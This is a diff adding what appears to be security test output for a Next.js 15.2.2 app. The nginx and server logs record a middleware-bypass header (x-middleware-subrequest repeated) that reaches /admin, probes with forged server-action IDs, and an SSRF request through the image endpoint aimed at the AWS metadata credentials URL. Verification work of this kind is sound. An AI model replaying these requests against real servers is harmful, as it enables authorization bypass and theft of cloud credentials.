@@ -1,0 +1,21 @@
+15.2.2   default     id d'action (html)                 406bd75102012bd3eaee8894ca20ece52e3c2ee938 (42 car.)
+15.2.2   default     id d'action (manifeste)            406bd75102012bd3eaee8894ca20ece52e3c2ee938
+15.2.2   default     29927 valeur x5                    200 CONTOURNÉ
+15.2.2   default     29927 valeur x1                    307
+15.2.2   default     Next-Action x… (1 car.)          500 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"}1:E{"digest":"3673433
+15.2.2   default     Next-Action 3c5a79… (42 car.) faux 500 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"}1:E{"digest":"3673433
+15.2.2   default     Next-Action 406bd7… (42 car.) réel 500 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"}1:E{"digest":"3673433
+15.2.2   default     SSRF image                         400 "url" parameter is not allowed | IMDS: 0 req.
+15.2.2 default next.log:  ⨯ [Error: Connection closed.] { digest: '3673433635' }
+15.2.2 default next.log:  ⨯ [Error: Connection closed.] { digest: '3673433635' }
+15.2.2 default next.log:  ⨯ [Error: Connection closed.] { digest: '3673433635' }
+15.2.2 default nginx: {"time":"2026-11-23T15:34:03+00:00","method":"GET","uri":"/form","status":200,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"GET","uri":"/admin","status":200,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware:middleware:middleware:middleware:middleware","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"POST","uri":"/form","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"x","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"POST","uri":"/form","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"3c5a79783be9e43a21aff1714df2e31587d4bad1bf","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"POST","uri":"/form","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"406bd75102012bd3eaee8894ca20ece52e3c2ee938","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.2.2 default nginx: {"time":"2026-11-23T15:34:05+00:00","method":"GET","uri":"/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75","status":400,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.2.2   permissive  SSRF image                         400 The requested resource isn't a valid image. | IMDS: 1 req.
+15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received text/html
+15.2.2 permissive nginx: {"time":"2026-11-23T15:34:21+00:00","method":"GET","uri":"/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75","status":400,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
